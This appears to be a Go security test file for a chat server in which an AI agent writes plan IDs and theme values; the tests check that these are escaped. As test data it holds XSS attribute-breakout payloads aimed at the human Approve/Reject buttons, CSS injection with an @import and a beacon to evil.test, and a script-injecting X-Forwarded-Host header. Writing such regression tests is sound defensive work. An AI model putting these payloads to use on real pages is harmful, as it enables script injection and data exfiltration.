package chat

import (
	"context"
	"encoding/json"
	"html"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/DonaldMurillo/gofastr/framework"
	"github.com/DonaldMurillo/gofastr/kiln/db"
	"github.com/DonaldMurillo/gofastr/kiln/journal"
	"github.com/DonaldMurillo/gofastr/kiln/live"
	"github.com/DonaldMurillo/gofastr/kiln/protocol"
	"github.com/DonaldMurillo/gofastr/kiln/world"
	_ "github.com/DonaldMurillo/gofastr/sqlite/stdlib"
)

// Property 1: model-authored plan IDs are attacker-controlled strings, and
// the plan card interpolates them into a SINGLE-quoted attribute
// (data-fui-rpc-body='{"plan_id":"…"}'). escAttr escapes " < > & but not ',
// so a plan_id containing ' breaks out of the attribute and injects real
// attributes onto the Approve/Reject buttons — the exact UI a human uses to
// gate destructive ops. propose_plan accepts any non-empty unique plan_id
// (protocol.go ProposePlan), so nothing upstream bounds the value.
func TestPlanCardAttrBreakoutIsNeutralized(t *testing.T) {
	hostile := []string{
		// attribute breakout with a click handler on the Approve button
		"p' onclick='alert(1)//",
		// hover-fired variant — no click needed
		"p' onmouseover='alert(1)//",
		// focus variant with autofocus chain
		"p' onfocus='alert(1)' autofocus='1",
	}
	for _, planID := range hostile {
		var b strings.Builder
		renderPlanCard(&b, &journal.Plan{
			PlanID:     planID,
			ProposedAt: time.Now(),
			Steps:      []string{"step"},
			Targets:    []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
		}, true)
		out := b.String()
		// Check ATTRIBUTE NAMES, not raw substrings. A bare ' or the text
		// "onclick=" sitting in an element's text content (the plan title
		// echoes the id verbatim) is inert — only a real attribute is the
		// vulnerability, and a substring search cannot tell them apart.
		for _, name := range attrNames(out) {
			if strings.HasPrefix(name, "on") || name == "autofocus" {
				t.Errorf("SECURITY: plan_id %q injected attribute %q into plan card:\n%s", planID, name, out)
			}
		}
	}
	// Happy path: a plan_id with double quotes stays inert, and the
	// rpc-body attribute remains valid JSON carrying the exact id (the
	// runtime json-parses this attribute value to dispatch the RPC).
	var b strings.Builder
	renderPlanCard(&b, &journal.Plan{PlanID: `p" onclick="alert(1)`, ProposedAt: time.Now()}, true)
	out := b.String()
	const marker = `data-fui-rpc-body='`
	start := strings.Index(out, marker)
	if start < 0 {
		t.Fatalf("rpc-body attribute missing:\n%s", out)
	}
	rest := out[start+len(marker):]
	end := strings.Index(rest, `'`)
	if end < 0 {
		t.Fatalf("unterminated rpc-body attribute:\n%s", out)
	}
	var body struct {
		PlanID string `json:"plan_id"`
	}
	// HTML-unescape first: the browser decodes entity references before the
	// runtime's JSON.parse ever sees the attribute value, so decoding here
	// is what models the real consumer. Parsing the raw source text would
	// fail on correctly-escaped markup.
	decoded := html.UnescapeString(rest[:end])
	if err := json.Unmarshal([]byte(decoded), &body); err != nil {
		t.Errorf("rpc-body is not valid JSON (%v):\n%s", err, decoded)
	} else if body.PlanID != `p" onclick="alert(1)` {
		t.Errorf("rpc-body plan_id = %q, want exact round-trip", body.PlanID)
	}
}

// attrNames returns every attribute name appearing in an HTML fragment.
//
// It is a deliberately small scanner rather than a full parser: it tracks
// whether it is inside a tag and skips over quoted attribute VALUES, so
// payload text that is correctly escaped inside a value can never be
// misread as an attribute name. That skipping is exactly the property
// under test — if escaping regresses, the injected name becomes visible
// here.
func attrNames(doc string) []string {
	var names []string
	for i := 0; i < len(doc); i++ {
		if doc[i] != '<' {
			continue
		}
		i++
		for i < len(doc) && doc[i] != '>' {
			switch {
			case doc[i] == '"' || doc[i] == '\'':
				q := doc[i]
				i++
				for i < len(doc) && doc[i] != q {
					i++
				}
				i++
			case isAttrNameByte(doc[i]):
				start := i
				for i < len(doc) && isAttrNameByte(doc[i]) {
					i++
				}
				if i < len(doc) && doc[i] == '=' {
					names = append(names, strings.ToLower(doc[start:i]))
				}
			default:
				i++
			}
		}
	}
	return names
}

func isAttrNameByte(c byte) bool {
	return c == '-' || c == '_' || c == ':' ||
		(c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}

// Property 2: theme values are agent-authored (set_theme) and land in CSS
// custom-property declarations that core-ui/style emits unescaped. The
// /__gofastr/app.css path guards this with kiln/render's safeThemeValue;
// the /kiln/theme.css path (applyAppOverrides) must not be a bypass.
func TestThemeCSSRejectsDeclarationBreakout(t *testing.T) {
	hostile := []string{
		// close the :root block and pull in attacker CSS
		"red;} @import url(//evil.test/x.css); :root{--x:0",
		// exfil beacon as a background fetch
		"red; background:url(//evil.test/ping)",
	}
	for _, v := range hostile {
		css := pageCSSFor(&world.AppConfig{Theme: map[string]string{"primary": v}})
		for _, marker := range []string{"@import", "url(//evil.test"} {
			if strings.Contains(css, marker) {
				t.Errorf("SECURITY: theme value %q smuggled %q into /kiln/theme.css output:\n%.400s", v, marker, css)
			}
		}
	}
	// Happy path: a plain color literal still resolves to the override.
	css := pageCSSFor(&world.AppConfig{Theme: map[string]string{"primary": "#22D3EE"}})
	if !strings.Contains(css, "#22D3EE") {
		t.Errorf("legit color override dropped from theme CSS:\n%.400s", css)
	}
}

// Property 3: world credentials (App.Auth.JWTSecret, App.Admin.SeedPassword)
// are masked on every endpoint that emits the world or app config.
// /kiln/world redacts (redactedWorld); /kiln/status?fields=world|app must
// not be a bypass.
func TestStatusDoesNotLeakWorldSecrets(t *testing.T) {
	d, cleanup, err := db.EphemeralSQLite("kiln-sec")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(cleanup)
	factory := func() *framework.App { return framework.NewApp(framework.WithDB(d)) }
	l, err := live.New(journal.NewMemory(), factory)
	if err != nil {
		t.Fatal(err)
	}
	tools := protocol.New(l)
	res := tools.SetAppConfig(context.Background(), protocol.SetAppConfigArgs{
		Config: world.AppConfig{
			Name: "sec-test",
			Auth: world.AuthConfig{Enabled: true, DevMode: true, JWTSecret: "jwt-canary-0123456789"},
			Admin: world.AdminConfig{
				Enabled: true, SeedEmail: "root@example.test", SeedPassword: "seed-canary-0123456789", // not-a-secret: canary the assertions grep for, proving the endpoint redacted it
			},
		},
	})
	if !res.OK {
		t.Fatalf("SetAppConfig: %+v", res)
	}

	srv := New(l, tools)
	for _, fields := range []string{"world", "app", "world,app"} {
		req := httptest.NewRequest(http.MethodGet, "/kiln/status?fields="+fields, nil)
		rec := httptest.NewRecorder()
		srv.serveStatus(rec, req)
		body := rec.Body.String()
		for _, canary := range []string{"jwt-canary-0123456789", "seed-canary-0123456789"} {
			if strings.Contains(body, canary) {
				t.Errorf("SECURITY: /kiln/status?fields=%s leaked %q:\n%.600s", fields, canary, body)
			}
		}
	}

	// Contrast surface: /kiln/world must stay redacted too (pins the
	// existing contract the new test defends).
	req := httptest.NewRequest(http.MethodGet, "/kiln/world", nil)
	rec := httptest.NewRecorder()
	srv.serveWorld(rec, req)
	if strings.Contains(rec.Body.String(), "jwt-canary-0123456789") {
		t.Errorf("/kiln/world leaked the JWT secret:\n%.600s", rec.Body.String())
	}
}

// Property 4: no caller-supplied header chooses the base URL substituted
// into the fallback host page, and whatever is substituted is HTML-escaped.
//
// The base lands inside <code>curl … __KILN_BASE__/kiln/tool/…</code> as
// raw text. X-Forwarded-* used to select it, which gave a header direct
// reach into the document; kiln binds loopback and is served directly, so
// nothing legitimately sets those headers and the trust was unearned. The
// host now comes from r.Host (pinned by the listener — see
// rebind_security_test.go) and is escaped on the way out.
func TestHostBaseIgnoresForwardedHeaders(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/anything", nil)
	req.Host = "localhost:8765"
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Host", "h.example</code><script>alert(1)</script>")
	html := HostHTMLForRequest(req)
	if strings.Contains(html, "<script>alert(1)</script>") {
		t.Errorf("SECURITY: X-Forwarded-Host reached the host page:\n%.600s", html)
	}
	if strings.Contains(html, "h.example") {
		t.Errorf("SECURITY: X-Forwarded-Host still selects the base URL:\n%.600s", html)
	}
	// The pinned Host — not the forwarded one — is what renders.
	if !strings.Contains(html, "http://localhost:8765/kiln/tool/add_entity") {
		t.Errorf("base URL not built from r.Host:\n%.600s", html)
	}
}

// Escaping is asserted independently of the header question: r.Host is
// pinned, but it is still request-derived text landing in HTML, so the
// substitution must escape rather than rely on the pin alone.
func TestHostBaseEscapesHost(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/anything", nil)
	req.Host = "h.example</code><script>alert(1)</script>"
	if html := HostHTMLForRequest(req); strings.Contains(html, "<script>alert(1)</script>") {
		t.Errorf("SECURITY: Host reflected unescaped into host page:\n%.600s", html)
	}
}
